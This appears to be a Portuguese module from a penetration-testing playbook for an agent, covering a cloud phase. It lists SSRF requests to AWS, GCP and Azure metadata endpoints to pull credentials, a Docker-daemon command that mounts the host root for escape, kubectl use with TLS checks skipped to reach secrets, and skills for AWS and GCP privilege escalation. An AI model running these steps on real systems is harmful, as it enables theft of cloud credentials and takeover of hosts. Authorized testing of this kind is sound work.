# FASE: CLOUD (módulo sob demanda)

Carregado quando: AWS/GCP/Azure keys, K8s/Docker expostos, SSRF→metadata (cross-phase).

## Gates
```
SSRF → metadata (vindo de web.md):
  169.254.169.254/latest/meta-data/iam/security-credentials/ → creds IAM AWS
  -H "Metadata-Flavor: Google" /computeMetadata/v1/          → token GCP
  -H "Metadata: true" /metadata/instance                     → token MSI Azure
  → creds extraídas → enxertar branch CLOUD + escalar

Docker daemon 2375/2376 → docker -H tcp://<alvo>:2375 run -v /:/host → RCE/escape
Kubernetes 6443/8443    → kubectl --insecure-skip-tls-verify → secrets, pods privilegiados
AWS keys                → enumerar (scoutsuite) → escalar (pacu/cloudsplaining)
GCP project             → gcpbucketbrute → IAM privesc
```

## Skill → Estado de Entrada
| Estado de entrada | Skill |
|---|---|
| AWS keys obtidas | `cybersecurity-skills:performing-aws-account-enumeration-with-scout-suite` |
| Role/user AWS, escalar | `cybersecurity-skills:performing-aws-privilege-escalation-assessment` |
| GCP project acessível | `cybersecurity-skills:performing-gcp-penetration-testing-with-gcpbucketbrute` |
| Cluster Kubernetes exposto | `cybersecurity-skills:performing-kubernetes-penetration-testing` |
